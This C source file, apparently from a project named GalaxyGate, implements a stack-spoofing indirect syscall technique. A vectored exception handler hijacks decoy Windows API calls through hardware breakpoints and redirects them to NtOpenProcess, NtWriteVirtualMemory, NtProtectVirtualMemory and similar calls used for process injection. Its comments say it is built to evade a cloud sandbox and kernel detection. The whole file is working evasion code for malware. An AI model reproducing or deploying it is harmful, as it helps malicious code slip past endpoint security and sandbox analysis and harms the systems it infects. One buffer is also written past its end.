#include "VEHinj.h"

#undef RtlZeroMemory

typedef struct _SFParams {
	DWORD ParamNum; // 真实调用的函数参数数量
	DWORD FuncHash; // 真实调用的函数哈希值
	DWORD DummyHash; // 傀儡函数哈希值
	DWORD_PTR param[17]; // Nt*函数最多有18个参数
} SFParams, * PSFParams;

DWORD* NullPointer = NULL;
SFParams Params = { 0 }; // 用于向VEH传递真实的函数调用参数
void PrintDbgW(wchar_t* message);
void ErrExit();

/*========================================
  GalaxyGate 自研栈欺骗间接系统调用方案 :3
  Author: 菜叶片ItsSunshineXD
========================================*/

/*
 以GetFileAttributesW为傀儡函数为例
 Step.1 引发访问冲突异常 通过VEH在NtQueryAttributesFile的syscall指令码处设置硬件断点
 Step.2 调用GetFileAttributesW函数 间接调用NtQueryAttributesFile触发断点
 Step.3 VEH捕获执行流 保留天然的调用堆栈 重设系统调用号和调用参数 实现栈欺骗
*/

LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS pExceptInfo) {
	if (pExceptInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
		if (pExceptInfo->ExceptionRecord->ExceptionInformation[0] != 1) {
			PrintDbgW(L"[-] 未知错误引发了非可写访问冲突 | An unknown error occured and invoked an access violation.");
			ErrExit();
		}
		pExceptInfo->ContextRecord->Dr0 = (DWORD_PTR)SW3_GetSyscallAddress(Params.DummyHash); // 在傀儡函数的syscall指令处设置硬件断点
		pExceptInfo->ContextRecord->Dr7 = 0x00000303; // 启用Dr0断点
		pExceptInfo->ContextRecord->Rip = pExceptInfo->ContextRecord->Rip + 6; // 跳过引发异常用的*NullPointer = 1指令
		// 在MSVC编译器环境中*NullPointer = 1指令的机器码长度为6Byte 若使用其他编译器 可能需要修改该值
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	else if (pExceptInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
		pExceptInfo->ContextRecord->Rcx = Params.param[1]; // 根据_Fastcall调用约定 设置真实调用参数
		pExceptInfo->ContextRecord->Rdx = Params.param[2];
		pExceptInfo->ContextRecord->R8 = Params.param[3];
		pExceptInfo->ContextRecord->R9 = Params.param[4];
		pExceptInfo->ContextRecord->R10 = Params.param[1];
		if (Params.ParamNum > 4) {
			int extra_para = Params.ParamNum - 4;
			DWORD64* stack = (DWORD64*)(pExceptInfo->ContextRecord->Rsp + 40); // 偏移40字节 保留影子空间
			for (int i = 5; i <= Params.ParamNum; ++i) {
				stack[i - 5] = (DWORD64)(Params.param[i]); // 通过堆栈传递剩余参数
			}
		}
		pExceptInfo->ContextRecord->Rax = SW3_GetSyscallNumber(Params.FuncHash); // 系统调用号换为真实调用函数
		pExceptInfo->ContextRecord->Rip = SW3_GetSyscallAddress(Params.FuncHash); // Rip指向真实调用的函数syscall指令码
		// 上一行是为了对抗天穹云沙箱 删除该行会被判断为直接系统调用
		pExceptInfo->ContextRecord->Dr0 = 0;
		pExceptInfo->ContextRecord->Dr7 = 0; // 清除调试寄存器 防止内核态对硬件断点的检测
		RtlZeroMemory(&Params, sizeof(Params));
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	return EXCEPTION_CONTINUE_SEARCH;
}



NTSTATUS SFNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect) {
	Params.param[1] = (DWORD_PTR)ProcessHandle;
	Params.param[2] = (DWORD_PTR)BaseAddress;
	Params.param[3] = (DWORD_PTR)RegionSize;
	Params.param[4] = (DWORD_PTR)NewProtect;
	Params.param[5] = (DWORD_PTR)OldProtect;
	Params.ParamNum = 5;
	Params.FuncHash = 0x097129F93;
	// DummyFunc1
	Params.DummyHash = 0x09E349EA7;
	*NullPointer = 1;
	ULONGLONG buf = 0;
	GetNumaNodeProcessorMask(0, &buf);
	// DummyFunc1
	return 0;
}

NTSTATUS SFNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
	Params.param[1] = (DWORD_PTR)ProcessHandle;
	Params.param[2] = (DWORD_PTR)BaseAddress;
	Params.param[3] = (DWORD_PTR)Buffer;
	Params.param[4] = (DWORD_PTR)NumberOfBytesToWrite;
	Params.param[5] = (DWORD_PTR)NumberOfBytesWritten;
	Params.ParamNum = 5;
	Params.FuncHash = 0x007901F0F;
	// DummyFunc2
	Params.DummyHash = 0x09E349EA7;
	*NullPointer = 1;
	ULONGLONG buf = 0;
	GetNumaNodeProcessorMask(0, &buf);
	// DummyFunc2
	return 0;
}

NTSTATUS SFNtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesRead) {
	Params.param[1] = (DWORD_PTR)ProcessHandle;
	Params.param[2] = (DWORD_PTR)BaseAddress;
	Params.param[3] = (DWORD_PTR)Buffer;
	Params.param[4] = (DWORD_PTR)BufferSize;
	Params.param[5] = (DWORD_PTR)NumberOfBytesRead;
	Params.ParamNum = 5;
	Params.FuncHash = 0x01D950B1B;
	// DummyFunc3
	Params.DummyHash = 0x0A6208368;
	*NullPointer = 1;
	DWORD buf[3] = { 0 };
	GetDiskFreeSpaceW(L"C:\\", &buf[0], &buf[1], &buf[2], &buf[3]);
	// DummyFunc3
	return 0;
}

NTSTATUS SFNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId) {
	Params.param[1] = (DWORD_PTR)ProcessHandle;
	Params.param[2] = (DWORD_PTR)DesiredAccess;
	Params.param[3] = (DWORD_PTR)ObjectAttributes;
	Params.param[4] = (DWORD_PTR)ClientId;
	Params.ParamNum = 4;
	Params.FuncHash = 0x0FEA4D138;
	// DummyFunc4
	Params.DummyHash = 0x09E349EA7;
	*NullPointer = 1;
	ULONGLONG buf = 0;
	GetNumaAvailableMemoryNode(0, &buf);
	// DummyFunc4
	return 0;
}

NTSTATUS SFNtQueryInformationProcess(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength) {
	Params.param[1] = (DWORD_PTR)ProcessHandle;
	Params.param[2] = (DWORD_PTR)ProcessInformationClass;
	Params.param[3] = (DWORD_PTR)ProcessInformation;
	Params.param[4] = (DWORD_PTR)ProcessInformationLength;
	Params.param[5] = (DWORD_PTR)ReturnLength;
	Params.ParamNum = 5;
	Params.FuncHash = 0x0DD27CE88;
	// DummyFunc5
	Params.DummyHash = 0x09E349EA7;
	*NullPointer = 1;
	ULONGLONG buf = 0;
	GetNumaNodeProcessorMask(0, &buf);
	// DummyFunc5
	return 0;
}

NTSTATUS SFNtDuplicateObject(HANDLE SourceProcessHandle, HANDLE SourceHandle, HANDLE TargetProcessHandle, PHANDLE TargetHandle, ACCESS_MASK DesiredAccess, ULONG HandleAttributes, ULONG Options) {
	Params.param[1] = (DWORD_PTR)SourceProcessHandle;
	Params.param[2] = (DWORD_PTR)SourceHandle;
	Params.param[3] = (DWORD_PTR)TargetProcessHandle;
	Params.param[4] = (DWORD_PTR)TargetHandle;
	Params.param[5] = (DWORD_PTR)DesiredAccess;
	Params.param[6] = (DWORD_PTR)HandleAttributes;
	Params.param[7] = (DWORD_PTR)Options;
	Params.ParamNum = 7;
	Params.FuncHash = 0x0ECBFE423;
	// DummyFunc6
	Params.DummyHash = 0x09E349EA7;
	*NullPointer = 1;
	ULONGLONG buf = 0;
	GetNumaNodeProcessorMask(0, &buf);
	// DummyFunc6
	return 0;
}

NTSTATUS SFNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
	Params.param[1] = (DWORD_PTR)SystemInformationClass;
	Params.param[2] = (DWORD_PTR)SystemInformation;
	Params.param[3] = (DWORD_PTR)SystemInformationLength;
	Params.param[4] = (DWORD_PTR)ReturnLength;
	Params.ParamNum = 4;
	Params.FuncHash = 0x09E349EA7;
	// DummyFunc7
	Params.DummyHash = 0x09E349EA7;
	*NullPointer = 1;
	ULONGLONG buf = 0;
	GetNumaAvailableMemoryNode(0, &buf);
	// DummyFunc7
	return 0;
}

NTSTATUS SFNtQueryVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, MEMORY_INFORMATION_CLASS MemoryInformationClass, PVOID MemoryInformation, SIZE_T MemoryInformationLength, PSIZE_T ReturnLength) {
	Params.param[1] = (DWORD_PTR)ProcessHandle;
	Params.param[2] = (DWORD_PTR)BaseAddress;
	Params.param[3] = (DWORD_PTR)MemoryInformationClass;
	Params.param[4] = (DWORD_PTR)MemoryInformation;
	Params.param[5] = (DWORD_PTR)MemoryInformationLength;
	Params.param[6] = (DWORD_PTR)ReturnLength;
	Params.ParamNum = 6;
	Params.FuncHash = 0x003910903;
	// DummyFunc8
	Params.DummyHash = 0x0A6208368;
	*NullPointer = 1;
	DWORD buf[3] = { 0 };
	GetDiskFreeSpaceW(L"C:\\", &buf[0], &buf[1], &buf[2], &buf[3]);
	// DummyFunc8
	return 0;
}
